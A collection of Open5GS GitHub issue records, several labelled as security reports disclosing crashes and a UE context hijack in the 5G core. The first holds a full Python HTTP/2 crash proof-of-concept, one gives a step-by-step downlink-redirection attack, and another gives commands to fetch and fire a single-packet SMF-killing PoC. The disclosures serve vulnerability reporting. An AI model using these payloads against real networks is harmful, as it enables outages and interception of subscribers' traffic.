items.body: ### Open5GS Release, Revision, or Tag v2.8.0 ### Steps to reproduce HTTP/2 POST (any endpoint) with Content-Type: multipart/related → nghttp2 on_frame_recv_callback → NF state machine (e.g., nrf_state_operational) → ogs_sbi_parse_request() [message.c:1311] → parse_content() [message.c:3120] → parse_multipart() [message.c:3380] → multipart_parser_execute() [multipart_parser.c:202] → on_header_value() [message.c:3241] ← CRASH poc： import socket, sys try: import h2.connection, h2.config, h2.events except ImportError: sys.exit("Install dependency: pip install h2") def crash_nf(host, port): boundary = "----CrashBoundary" body = ( f"--{boundary}\r\n" f"Content-Type: application/json\r\n" f"Content-Type: application/json\r\n" # Duplicate → triggers ogs_assert f"\r\n" f'{{"test":"crash"}}\r\n' f"--{boundary}--\r\n" ).encode() sock = socket.create_connection((host, port), timeout=5) config = h2.config.H2Configuration( client_side=True, header_encoding="utf-8" ) conn = h2.connection.H2Connection(config=config) conn.initiate_connection() sock.sendall(conn.data_to_send()) conn.send_headers(1, [ (":method", "POST"), (":path", "/trigger"), # Any path works (":scheme", "http"), (":authority", f"{host}:{port}"), ("content-type", f"multipart/related; boundary={boundary}"), ("content-length", str(len(body))), ]) conn.send_data(1, body, end_stream=True) sock.sendall(conn.data_to_send()) try: sock.settimeout(3) data = sock.recv(65535) if not data: print("[+] Empty response — target likely crashed") except (socket.timeout, ConnectionResetError, BrokenPipeError): print("[+] Connection lost — target crashed (SIGABRT)") finally: sock.close() if __name__ == "__main__": if len(sys.argv) < 3: print(f"Usage: {sys.argv[0]} ") sys.exit(1) host, port = sys.argv[1], int(sys.argv[2]) print(f"[*] Sending crash payload to {host}:{port}") crash_nf(host, port) log： ### Logs ```shell ``` ### Expected behaviour When a client sends an HTTP request whose multipart body contains a duplicate per-part header (e.g. two `Content-Type` lines inside one part), the parser should treat this as malformed input: 1. Reject the request with HTTP `400 Bad Request`; 2. Log the parse error and release the partially parsed message; 3. Keep the NF process running and continue serving other clients. A duplicate header must never terminate the process ### Observed Behaviour The process is killed immediately with `SIGABRT` and sends no HTTP response; subsequent connections to the NF are refused until an external supervisor restarts it. ### eNodeB/gNodeB _No response_ ### UE Models and versions _No response_

items.title: [Bug]: Static IPv4 assigned to Subscriber A can be dynamically allocated to Subscriber B after profile modification

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

The issue was observed while using static IPv4 assignments.

The following sequence appears to reproduce the problem:

1. Subscriber A is configured with a static IPv4 address.
   Example:
       IMSI: 999990000000002
       UE IPv4 Address: 100.80.1.2

2. Subscriber B is not using static IP.

3. Subscriber B establishes a new PDU Session.

4. SMF allocates the IPv4 address that is statically configured for Subscriber A
   (100.80.0.2), even though Subscriber A still owns that address in its subscriber profile.

5. Later, Subscriber A loses connectivity.

6. Subscriber A no longer sends new Registration/PDU Session procedures successfully until either:
   - the UE is rebooted, or
   - the Open5GS core services are restarted.

The problem was confirmed by checking SMF logs using the duplicated IPv4 address rather than the IMSI.


### Logs

```shell
07/08 07:03:37.779: [ausf] INFO: [imsi-999990000000003] AUSF-UE removed (../src/ausf/ausf-sm.c:378)
07/08 07:03:37.776: [smf] INFO: Removed Session: UE IMSI:[imsi-999990000000003] DNN:[test:6] IPv4:[100.80.1.2] IPv6:[2001:db8:cafe:200::201] (../src/smf/context.c:1789)
07/08 07:04:07.668: [smf] INFO: UE SUPI[imsi-999990000000003] DNN[test] IPv4[100.80.1.3] IPv6[2001:db8:cafe:2a9::2aa] (../src/smf/npcf-handler.c:590)
```

### Expected behaviour

A statically assigned IPv4 address must never be allocated dynamically to another subscriber.

The IPv4 allocator should exclude all statically assigned addresses from the dynamic allocation pool, regardless of whether another subscriber has recently been modified.

At no point should two different subscribers be able to obtain the same IPv4 address.

At the smf.yaml and upf.yaml files, its possible to configure the subnet address, but is not possible to define the dynamic address pool.


### Observed Behaviour

SMF dynamically allocated an IPv4 address that was statically assigned to another subscriber.

After this happened:

- Subscriber A lost connectivity.
- Subscriber A no longer generated successful registration/PDU session procedures.
- Restarting the gNB did not solve the issue.
- Rebooting the UE restored connectivity.
- Restarting the Open5GS core also restored connectivity.

Additionally, the subscriber's PDU session was still visible through the Open5GS PDU session API, while no corresponding database session existed.

### eNodeB/gNodeB

Zary 

### UE Models and versions

Huawei 153-381

items.title: [Security Bug]: AMF accepts NGAP PathSwitchRequest without ownership check + Crashes due to race condition

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). 
Still unfixed on current main (source-checked 2026-09-04 @ `941e4cc2d`).

### Security impact

Any associated peer can re-home a live UE's NGAP context and redirect
its downlink FAR to an attacker-chosen endpoint due to a lack of ownership in the
referenced UE context. The redirection of the victim's downlink stream to 
an attacker-controlled endpoint is the confidentiality/integrity impact, and the controlled 
outage is the availability impact.

**Update: The same primitive can also be used to trigger AMF process abort with no SMF 
precondition due to race condition**

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **AMF** — NGAP PathSwitchRequest handling
(`src/amf/ngap-handler.c`, `ngap_handle_path_switch_request()`) and the
UE-context/`ran_ue` management it drives.

### Summary

`ngap_handle_path_switch_request()` resolves the target UE with a global
lookup by the AMF_UE_NGAP_ID carried in the message
(`ran_ue_find_by_amf_ue_ngap_id()`, `src/amf/ngap-handler.c:3074`) and
never verifies that the sending NGAP association is the one that
currently owns (serves) that UE context. Any associated gNB, including
a rogue gNB smuggled out of a UE data plane, can re-home a
live peer UE's NGAP context to itself by knowing or enumerating the
peer's AMF_UE_NGAP_ID. After acceptance, the AMF runs its normal 
path-switch chain: the context move is logged
([OLD]/[NEW] RAN_UE_NGAP_ID), the handler's PDU-session loop sends an
N11 SM-context update, and the SMF/UPF rewrite the victim's downlink
FAR toward the attacker's endpoint (UPF `gtp_connect() [10.45.0.9]:2152`). 
The victim's downlink was measurably cut and recovered only
when the victim re-registered (a full re-registration on a new address).

This bug can also be used to trigger a race condition assert.
1. The PathSwitchRequest handler switches the victim's context to the
   sender's gNB with no ownership check
   (`ran_ue->gnb_id = gnb->id`).
2. When that association goes down, `amf_gnb_remove()` frees the
   `amf_gnb_t` while the per-UE deactivation chain (N11/PFCP for the
   victim's live PDU sessions) is still in flight. The `ran_ue` is not
   reaped (the sweep skips it because the deactivation created new SBI
   transactions) but keeps pointing at the freed gNB.
3. A PathSwitchRequest re-claim for the victim's AMF_UE_NGAP_ID
   arriving inside that window (delta ≈ 0–1 ms observed) resolves the
   still-alive context, then `ran_ue_switch_to_gnb()` resolves the
   dangling `gnb_id` → `amf_gnb_find_by_id()` returns NULL →
   `ogs_assert(gnb)` aborts `open5gs-amfd`
   (`src/amf/context.c:1451`). amfd is left `<defunct>`; every NGAP
   service is lost until the open5gs containers restart.

These issues are still present on current main (`1f70b24c`).
The RAN-node-ownership enforcement commit `9a22baa76`
("Enforce RAN node ownership in handover handlers") adds
`source_ue->gnb_id != gnb->id` checks to the NGAP/S1AP handover handlers
but its own commit message explicitly excludes PathSwitchRequest.

### Steps to reproduce
#### Issue A: PathSwitchRequest from any peer.
Lab: Two attached UEs.
* Attacker UE `10.45.0.9`
* Benign peer UE `10.45.0.8`
* Core container `192.168.233.132` hosting both AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).

1. Attach both UEs.
2. From the attacker UE, open an SCTP association to
   `192.168.233.132:38412` with inner IP packets sent as ordinary uplink
   IP packets through the attacker's established PDU session (the UPF
   decapsulates and the kernel delivers them to the AMF, as in the PFCP
   smuggling path). AMF log: `gNB-N2 accepted[10.45.0.9]:33250 in
   ng-path module`.
3. Complete NG Setup with a gNB ID distinct from the real gNB (fake gNB
   ID 2) and the lab PLMN/TAC (001/01, TAC 1) — NGSetupResponse,
   successfulOutcome (proc 21), 54 bytes.
4. Probe PathSwitchRequest candidates (attacker-chosen RAN_UE_NGAP_ID
   5000, UserLocationInformation with the lab TAC): ErrorIndication-sweep
   the 60 unknown AMF_UE_NGAP_IDs (3–7, 10–64, PDU Session ID 1), then
   send three probes each (PDU Session IDs 1, 2, 3) to the two live IDs
   — the peer's (8) and the attacker's own (9). Record per-candidate
   responses.
5. The peer's live ID 8 with session 1 is accepted: verify the
   `[OLD]`/`[NEW]` context move in the AMF log, the UPF Session
   Modification with `gtp_connect() [10.45.0.9]:2152` two milliseconds
   later, and re-measure the peer's downlink. The attacker's own ID 9 is
   likewise accepted (context re-homed, UPF session modified) but its
   probes draw no decodable response.

#### Issue B: Crash AMF
Lab: Two attached UEs.
* Attacker UE (PDU-session address `10.45.0.2`
* Benign peer UE `imsi-001010123456790` with a live PDU session.
* Core container `192.168.233.132` hosting AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).
Script: `r8b_race.py` (attached zip; staged in the attacker UE container with
the `ueprobe` package and `pycrate`); the associations are smuggled as
ordinary uplink IP packets through the attacker's PDU session.

1. Attach both UEs (the peer's live session is what keeps its `ran_ue`
   alive through the removal).
2. From the attacker UE open association B (NG Setup, gNB ID 3), then
   association A (NG Setup, gNB ID 2). Both get NGSetupResponse
   (successfulOutcome, proc 21).
3. Re-home the peer's context onto A: PathSwitchRequest from A
   (attacker-chosen `RAN_UE_NGAP_ID` 5000, the peer's live
   `AMF_UE_NGAP_ID`, UserLocationInformation with the lab TAC) →
   PathSwitchRequestAcknowledge (proc 25).
4. SHUTDOWN A and, delta = 0, send the re-claim PathSwitchRequest for
   the peer's ID from B (single burst pre-associated, no handshake
   inside the window). The script sweeps delta 0–40 ms in 0.4 ms steps
   for robustness.
5. Detect: no response to the re-claim and a fresh NG Setup that gets
   no answer, meaning that amfd is gone. The script's liveness check is a full NG
   Setup exchange (a raw-SCTP connect alone cannot see a dead peer).

### Logs (Attached)
#### Issue A: PathSwitchRequest from any peer.
[R8-amf-pathswitch-context-hijack.zip](https://github.com/user-attachments/files/31734861/R8-amf-pathswitch-context-hijack.zip)

```shell
[amf] INFO: gNB-N2 accepted[10.45.0.9]:33250 in ng-path module
[amf] INFO: PathSwitchRequest
[amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[3]    (x60: ids 3..7 and 10..64, cause radioNetwork=14)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[8] AMF_UE_NGAP_ID[8]     (14:33:27.685 — peer's live ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[8]
[upf] DEBUG: Session Modification Request                     (14:33:27.687)
[gtp] INFO: gtp_connect() [10.45.0.9]:2152                    (14:33:27.687)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[9] AMF_UE_NGAP_ID[9]     (14:33:27.851 — attacker's own ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[9]
[upf] DEBUG: Session Modification Request                     (14:33:27.852)
```

(all lines from `q023_amf.log` and `q023_upf.log`. `q023_smf.log`'s
capture starts at 14:33:28.167, so the N11 SM-context update has no
SMF-side line; the only `POST /nsmf-pdusession/v1/sm-contexts/7/modify`
in it is at 14:34:05.777 — the association-release-phase modify for the
victim's session, after which the downlink stayed cut.)

(Each accepted path switch also logs `UE Security Capability mismatch in PathSwitchRequest`.
Per TS 33.501 6.7.3.1 comment in the handler, the AMF answers a mismatched
PathSwitchRequest with its locally stored UE security capabilities in
the PathSwitchRequestAcknowledge (`ngap-handler.c:3310-3314`).)

58 diverted GTP-U datagrams were captured on
the attacker's UDP 2152 listener (`q023_sink.jsonl`), all on the
attacker's own-session TEID 0xa5000091, none on the peer-session TEID
0xa5000081 (attacker-chosen and installed by the AMF in the victim's
downlink FAR).

#### Issue B: Crash AMF

[R8b-amf-pathswitch-context-hijack-crash.zip](https://github.com/user-attachments/files/31863769/R8b-amf-pathswitch-context-hijack-crash.zip)

Run 4 of 4 (11:09:06), verbatim from `amf.log`
(`amf-crash-r8b3-w4.log` in the zip; runs 1–3 in `amf-crash-r8b3-w1/2/3.log`):

    09/05 11:09:05.944: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:05.944: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[4] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [OLD] TAC[1] CellID[0x10] (ngap-handler.c:3104)
    09/05 11:09:05.944: [amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [NEW] TAC[1] CellID[0x10] (ngap-handler.c:3306)
    09/05 11:09:06.495: [amf] INFO: gNB-N2[10.45.0.2] connection refused!!! (amf-sm.c:882)
    09/05 11:09:06.495: [amf] INFO: [Removed] Number of gNBs is now 2 (context.c:1305)
    09/05 11:09:06.495: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:06.495: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:06.496: [amf] INFO:     [OLD] TAC[1] CellID[0x10]
    09/05 11:09:06.496: [amf] FATAL: ran_ue_switch_to_gnb: Assertion `gnb' failed. (../open5gs-src/src/amf/context.c:1451)
    09/05 11:09:06.496: [core] FATAL: backtrace() returned 11 addresses (../open5gs-src/lib/core/ogs-abort.c:37)

Four consecutive runs, identical fingerprint, delta = 0 each time:

| run | re-home | `[Removed]` | re-claim → FATAL (`context.c:1451`) |
|-----|-----------------|--------------------|--------------------------------------|
| 1   | 10:55:58.825    | 10:55:59.376       | 10:55:59.377                         |
| 2   | 11:01:26.841    | 11:01:27.391       | 11:01:27.392                         |
| 3   | 11:06:44.628    | 11:06:45.179       | 11:06:45.180                         |
| 4   | 11:09:05.944    | 11:09:06.495       | 11:09:06.496                         |

After each abort `open5gs-amfd` is `<defunct>` (zombie; no child reaper
restarts it) meaning that we get no NGAP service until the open5gs containers restart.

### Expected behaviour

The AMF must verify that the NGAP association sending a
PathSwitchRequest is the association that currently owns (serves) the
referenced UE context, and reject otherwise (cause: unexpected NGAP peer
/ unknown local UE NGAP-ID) without leaking which AMF_UE_NGAP_IDs are
live. Additionally, the AMF must never resolve a UE context to a freed gNB. The association
close and the UE-context cleanup must be ordered so no `ran_ue` can
outlive the gNB it points at. A re-claim for a context the sender does not own
should additionally fail the ownership check before any switch.
**Upstream itself applied exactly this class of ownership check to
the neighbouring handlers in `9a22baa76`.**

### Observed Behaviour
#### Issue A: PathSwitchRequest from any peer.
```c
/* src/amf/ngap-handler.c @ ee596937d — ngap_handle_path_switch_request() */
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);        /* :3074 — global lookup */
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]",
            (long long)amf_ue_ngap_id);
    r = ngap_send_error_indication(
            gnb, (uint64_t *)RAN_UE_NGAP_ID, &amf_ue_ngap_id,
            NGAP_Cause_PR_radioNetwork,
            NGAP_CauseRadioNetwork_unknown_local_UE_NGAP_ID);
    return;
}
amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
…
/* Change ran_ue to the NEW gNB after mandatory IE validation */   /* :3288 */
ran_ue_switch_to_gnb(ran_ue, gnb);                                  /* :3289 */
ogs_info("    [NEW] RAN_UE_NGAP_ID[%lld] AMF_UE_NGAP_ID[%lld] ",    /* :3291 */
    (long long)ran_ue->ran_ue_ngap_id, (long long)ran_ue->amf_ue_ngap_id);
```

The lookup is global across all gNB associations: `gnb` (the sending
association) is never compared with the context's serving gNB. The
ErrorIndication branch at `:3074-3085` is the enumeration oracle — it
distinguishes "no such UE" from "accepted" on the same ID space. After
acceptance the handler logs the `[OLD]`/`[NEW]` move and proceeds into
the N11/N4 modification chain.

#### Issue B: Crash AMF
`ogs_assert(gnb)` fails in `ran_ue_switch_to_gnb()` (`context.c:1451`)
and amfd aborts as `<defunct>` zombie and we get no NGAP service until the
containers restart.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Bug]: SCP returns HTTP 500 when the target NF is unavailable

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: type:spec-noncompliance
labels.description: Non-compliance with mandatory 3GPP specification requirements.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

Start Open5GS SCP on 127.0.0.200:7777 and NSSF on 127.0.0.14:7777. First verify that an HTTP/2 request sent through the SCP with “User-Agent: AMF” and “3gpp-sbi-target-apiroot: http://127.0.0.14:7777” reaches NSSF. Stop NSSF with “sudo systemctl stop open5gs-nssfd”, confirm that 127.0.0.14:7777 is no longer listening, and send the same request through the SCP again. The request used GET /nnssf-nsselection/v2/network-slice-information with valid query parameters. Restart NSSF after reproducing the issue.

### Logs

```shell
When NSSF is unavailable, a direct request fails with ConnectionRefusedError, while the request through SCP returns HTTP 500 with the ProblemDetails response {"title":"response_handler() failed","status":500}. NSSF was then restarted successfully and the same request returned its original HTTP 400 business response. The SCP and NSSF processes did not crash.
```

### Expected behaviour

When the target NF cannot be reached, the SCP should return an appropriate gateway or service-availability status such as HTTP 502, 503, or 504 with a clear ProblemDetails response indicating that the target NF is unavailable. A downstream connection failure should not be exposed as a generic HTTP 500 internal server error.

### Observed Behaviour

The SCP returns HTTP 500 with {"title":"response_handler() failed","status":500} when the configured target NSSF is stopped and its SBI port refuses connections. The response does not identify the target NF availability problem. After NSSF is restarted, the same request returns the original NSSF business response, confirming that the HTTP 500 is specifically caused by target NF unavailability.

[nssf_outage_recovery.zip](https://github.com/user-attachments/files/29927688/nssf_outage_recovery.zip)

### eNodeB/gNodeB

Not applicable. The issue is reproduced directly over the HTTP/2 SBI interface and does not require a gNodeB.

### UE Models and versions

Not applicable. No UE is required to reproduce this SCP error-handling issue.

items.title: [Bug]: a 34-octet Create Session Request with a Zero-Length IMSI IE Aborts the SMF (`ogs_assert(imsi_len)`)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Summary

- **Commit ID**: `157f611a530e292e40ec50f9d23f0ef5d4fcd6a6` (tag `v2.8.0`)
- **CVSS 4.0**: 8.7 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- **Vulnerability Type**: CWE-617 / CWE-20 (Reachable Assertion / Improper Input Validation)

The SMF/PGW's GTPv2-C endpoint (UDP 2123) accepts Create Session Requests from any peer. `smf_sess_add_by_gtp2_message()` checks only that an IMSI information element is *present* in the request, then hands the element's data pointer and its length straight to `smf_ue_find_by_imsi()` — whose first statement asserts that the length is non-zero. A request whose IMSI IE is present but zero-length therefore walks from the session-creation entry point into an unconditional `ogs_assert(imsi_len)`.

The gate is missing because the IE length is never validated before the lookup: the presence check passes on the (data, len = 0) pair produced by a truncated IE, and nothing between it and the lookup rejects an empty identifier. Upstream has fixed the identical assertion shape in the SGW-C twin of this code but left the SMF copy untouched, so the path remains reachable on a current build.

`ogs_assert()` is compiled in unconditionally: on failure it logs a FATAL line, prints a backtrace and calls `abort()`, so one 34-octet UDP datagram kills the SMF/PGW process with SIGABRT (container exit 134). The NF stays down until an operator restarts it, and the neighbour NFs de-register it as heartbeats stop.


### Open5GS Release, Revision, or Tag

v2.8.0; `main` is still affected.

### Steps to reproduce

Tested target: the `docker_open5gs` compose deployment (open5GS SA + VoNR, 23 containers); attacker runs on the Docker host (bridge `172.22.0.1`); SMF GTP-C at `172.22.0.7:2123/udp`. No subscribers, no RAN.

1. **Deploy the target core**

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
   docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
   sleep 45                     # let the NFs register at the NRF
   docker start smsc            # smsc races the MySQL init on a cold start
   # provision
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --core-network open5gs --count 5 \
        --plmn 46009 --initial-imsi-index 1 \
        --ki 12341234123412341234123412340000 \
        --opc 71a121bb69baf3c0cc53fb5038a0131f \
        --dnn internet --enable-ims \
        --core-address 127.0.0.1 --webui-port 9999 \
        --username admin --password 1423
   ```

2. **Confirm the SMF answers GTPv2-C Echo**

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260926-POC/smf_gtpc_zerolen_imsi_poc.py
   chmod +x smf_gtpc_zerolen_imsi_poc.py
   ./smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --port 2123 --mode echo
   # -> pre-shot liveness: alive=True  (Echo Response received)
   ```

3. **Run the well-formed control** (same IEs, plus an 8-octet BCD IMSI — 42 octets on the wire)

   ```bash
   ./smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --port 2123 --mode control
   # -> Create Session Response, cause 0x46 = 70 (Mandatory IE missing); SMF stays alive
   ```

4. **Fire the defect and verify** (34-octet request, IMSI IE length 0)

   ```bash
   ./smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --port 2123 --mode crash
   # -> post-shot liveness: alive=False  (no Echo Response)
   docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}}' smf
   # -> exited exit=134 oom=false
   docker logs smf 2>&1 | tail -15
   ```


### Logs

```shell
`docker logs smf` — the abort after the 34-octet datagram arrives:


10/11 12:40:34.354: [smf] FATAL: smf_ue_find_by_imsi: Assertion `imsi_len' failed. (../src/smf/context.c:1380)
10/11 12:40:34.355: [core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c:37)
./open5gs-smfd(+0x1a17d) [0x557dd132e17d]
./open5gs-smfd(+0x1b99a) [0x557dd132f99a]
./open5gs-smfd(+0x29122) [0x557dd133d122]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7fe7fc96f2bd]
./open5gs-smfd(+0x11ee1) [0x557dd1325ee1]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x12960) [0x7fe7fc95f960]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7fe7fb5a2609]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7fe7fb4c7353]
/open5gs_init.sh: line 102:    60 Aborted                 (core dumped) ./open5gs-smfd
```

### Expected behaviour

A malformed IMSI IE must be rejected at the protocol level — the request discarded or answered with a Create Session Response carrying an error cause — and the process must never terminate on peer-controlled input. The well-formed control shows the SMF answering `cause 70` and remaining alive; the zero-length variant must degrade exactly the same way.


### Observed Behaviour

One unauthenticated 34-octet datagram: the SMF logs the FATAL assertion at `src/smf/context.c:1380`, aborts (`exit=134`, `oom=false`) and stops answering GTPv2-C Echo. The PoC reports `alive=True` before the shot and `alive=False` after it. Neighbour NFs then lose their peer — the NRF/SCP mark the SMF de-registered on missed heartbeats and the UPF logs the loss of its PFCP peer — leaving the core degraded until the SMF is restarted manually.

### eNodeB/gNodeB

None — control-plane-only attack, no radio access network involved.

### UE Models and versions

None — no UE involved.

items.title: AMF/SMF stale UE context after gNB SCTP reconnection causes PDU session failure (HTTP 400)

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
**Description**

When a gNB disconnects and reconnects (e.g. during cell reconfiguration that requires lock/unlock), some UEs — particularly iPhone 17 Pro Max — end up in a state where they are registered but have no data connectivity. The SMF logs show repeated HTTP response error [400] when attempting N1N2 message transfer.

  **Environment**
  - Open5GS v2.7.6 on Ubuntu 22.04
  - Commercial 5G SA gNB (NR TDD, n77)
  - UE: iPhone 17 Pro Max with dual SIM (private 5G eSIM + commercial SIM)
  - iPhone 14 on the same cell does not exhibit this issue

  **Steps to Reproduce**
  1. gNB connected to Open5GS AMF via SCTP, UEs attached with active PDU sessions
  2. gNB performs cell reconfiguration (internally does lock/unlock, dropping SCTP association)
  3. SCTP association re-establishes, gNB sends NG Setup Request, AMF accepts
  4. iPhone re-registers (Registration complete logged in AMF)
  5. iPhone requests PDU session — SMF creates session and assigns IP
  6. SMF sends N1N2 message transfer to AMF — gets HTTP 400
  7. Session removed, iPhone retries every ~16 seconds, same failure
  8. iPhone shows "attached" but has no data connectivity

  **AMF/SMF Log**
```
  [gmm] INFO: [imsi-xxxx] Registration complete
  [gmm] INFO: UE SUPI[imsi-xxxx] DNN[internet] S_NSSAI[SST:1 SD:0xffffff] smContextRef[NULL]
  [smf] ERROR: [imsi-xxxx:1] HTTP response error [400]
  [amf] ERROR: No UE context [imsi-xxxx]
  [amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[64]
```
  **Expected Behaviour**
When the SCTP association drops, the AMF should fully clean up all UE contexts (AMF-UE, RAN-UE, and associated SMF sessions). When the gNB reconnects and UEs re-register, they should get a completely fresh context with working PDU sessions.

  **Workaround**
Restarting open5gs-amfd and open5gs-smfd after the gNB reconnects clears the stale state and UEs connect successfully on the next attempt.

  **Additional Notes**
  - The issue is more pronounced with iPhone 17 Pro Max than iPhone 14
  - The gNB's SCTP disconnect/reconnect happens within seconds
  - UPF data path is confirmed working (ping from UPF to UE IP succeeds) but zero packets appear on ogstun from the affected UE

items.title: [Bug]: AMF DoS via unchecked NULL RAN-UE context in amf_nnrf_handle_nf_discover() during delayed NRF Discovery response

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

AMF crashes in `amf_nnrf_handle_nf_discover()` when a delayed NRF Discovery response arrives after the associated RAN-UE context has already been removed.

The affected path resolves the stored `ran_ue_id` with `ran_ue_find_by_id()` and immediately asserts the result with `ogs_assert(ran_ue)`. If the RAN-UE context no longer exists, `ran_ue_find_by_id()` returns NULL and the assertion terminates the AMF process.

The v2.7.7 release includes several AMF/SBI race-condition fixes, including PR #4081, #4178, and #4346. However, this specific NRF Discovery callback path still lacks the corresponding NULL check after `ran_ue_find_by_id()`.

A related guarded timer-expiry path in `src/amf/amf-sm.c` already handles this case:

```c
// src/amf/amf-sm.c - related guarded timer-expiry path
if (ran_ue_id < OGS_MIN_POOL_ID || ran_ue_id > OGS_MAX_POOL_ID) {
    ogs_error("No assoc RAN-UE id [%d]", ran_ue_id);
    break;
}
ran_ue = ran_ue_find_by_id(ran_ue_id);
if (!ran_ue) {
    ogs_error("[%s:%s:%d:%d] "
            "NG Context has already been removed",
            amf_ue->supi, amf_ue->suci, sess->psi, sess->pti);
    break;
}
```

By contrast, the NRF Discovery callback path reaches `ogs_assert(ran_ue)` without equivalent NULL handling:

```c
// src/amf/nnrf-handler.c:88-89
ran_ue = ran_ue_find_by_id(ran_ue_id);
ogs_assert(ran_ue);   // NULL -> ogs_abort() -> AMF crash
```

### Conditions observed in the controlled reproduction

The crash was reliably reproduced when the following conditions coincided:

1. SMF absent from AMF's NF instance cache
   - For example, after SMF crash, restart, or deregistration.

2. NRF Discovery response delayed
   - For example, due to network delay, NRF overload, or controlled delayed response in a lab environment.

3. gNB N2 connection terminated during the discovery window
   - For example, SCTP association shutdown/abort, gNB restart, NG Reset, or UE context release.
   - RLF may indirectly lead to UE context release depending on implementation, but RLF itself is not an SCTP shutdown mechanism.

4. SCP discovery disabled or unavailable
   - When SCP is reachable, discovery may route via `client_discover_cb`, which already contains NULL handling for a removed RAN-UE context.
   - This condition is realistic for lab, research, or minimal deployments where the SCP process is not deployed, disabled, or unavailable.

> Note: Open5GS v2.7.7's packaged default `amf.yaml` includes an active SCP client URI (`http://127.0.0.200:7777`), while the direct NRF client URI is commented out. The crash was reproduced in a lab configuration where the NRF Discovery response reached `amf_nnrf_handle_nf_discover()`.

### Lab reproduction sequence

1. Existing lab gNB connects to AMF N2 over SCTP port 38412.

2. UE attaches and requests a PDU Session.

3. SMF is absent from the AMF NF instance cache.

4. AMF sends an asynchronous NRF Discovery request through the NSSF-assisted discovery path.

5. During the discovery window, the lab gNB process is terminated.

6. AMF handles the N2 termination and removes the associated RAN-UE context.

7. The delayed NRF Discovery response arrives.

8. `amf_nnrf_handle_nf_discover()` is invoked.

9. `ran_ue_find_by_id(ran_ue_id)` returns NULL.

10. `ogs_assert(ran_ue)` fails and AMF terminates via `ogs_abort()`.

Primary reproduction result:

- Scapy SCTP ABORT method: 5/5 successful reproductions under controlled lab conditions.
- Additional validation: graceful SCTP shutdown via lab gNB SIGTERM reproduced the same AMF crash condition.

### Suggested fix

Apply a defensive NULL-check pattern consistent with existing guarded paths. The following is an illustrative defensive pattern; maintainers may adapt the cleanup path to the existing SBI transaction lifecycle:

```c
// src/amf/nnrf-handler.c - suggested defensive pattern
// BEFORE:
ogs_assert(ran_ue_id >= OGS_MIN_POOL_ID && ran_ue_id <= OGS_MAX_POOL_ID);
ran_ue = ran_ue_find_by_id(ran_ue_id);
ogs_assert(ran_ue);

// AFTER:
if (ran_ue_id < OGS_MIN_POOL_ID || ran_ue_id > OGS_MAX_POOL_ID) {
    ogs_error("No assoc RAN-UE id [%d]", ran_ue_id);
    ogs_sbi_xact_remove(xact);
    return;
}

ran_ue = ran_ue_find_by_id(ran_ue_id);
if (!ran_ue) {
    ogs_error("NG Context has already been removed");
